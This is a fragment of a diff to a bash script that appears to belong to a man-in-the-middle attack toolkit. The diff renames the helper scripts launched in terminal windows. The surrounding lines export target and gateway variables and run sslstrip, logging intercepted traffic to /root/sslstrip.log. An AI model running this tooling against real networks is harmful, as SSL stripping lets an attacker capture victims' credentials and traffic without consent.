@@ -1367,10 +1367,10 @@ then
 		export TARGIP
 		export PORTTCP
 		export PORTUDP
-		cd "$EPATH"/ls
-		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
-		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
-		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
+		cd "$EPATH"/eht
+		gnome-terminal --geometry 60x12+0+999999 -e ./eht5
+		gnome-terminal --geometry 60x20+999999+999999 -e ./eht52
+		gnome-terminal --geometry 60x20+999999+0 -e ./eht51
 		sslstrip -l $PORTTCP -w /root/sslstrip.log
 		echo -e "$PAKTGB"
 		$READAK
@@ -1398,10 +1398,10 @@ then
 		export TARGIP
 		export PORTTCP
 		export PORTUDP
-		cd "$EPATH"/ls
-		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
-		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
-		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
+		cd "$EPATH"/eht
+		gnome-terminal --geometry 60x25+0+999999 -e ./eht5
+		gnome-terminal --geometry 60x25+999999+0 -e ./eht51
+		gnome-terminal --geometry 60x25+999999+999999 -e ./eht52
 		sslstrip -l $PORTTCP -w /root/sslstrip.log
 		echo -e "$PAKTGB"
 		$READAK
@@ -1499,9 +1499,9 @@ then
 		export GATEINT
 		export TARGIP
 		export GATENM
-		cd "$EPATH"/ls
-		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
-		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
+		cd "$EPATH"/eht
+		gnome-terminal --geometry 60x15+999999+0 -e ./eht51
+		gnome-terminal --geometry 60x15+999999+999999 -e ./eht52
 	#~ elif [[ "$MITMSET" = "4" ]]
 	#~ then
 		#~ service apache2 start
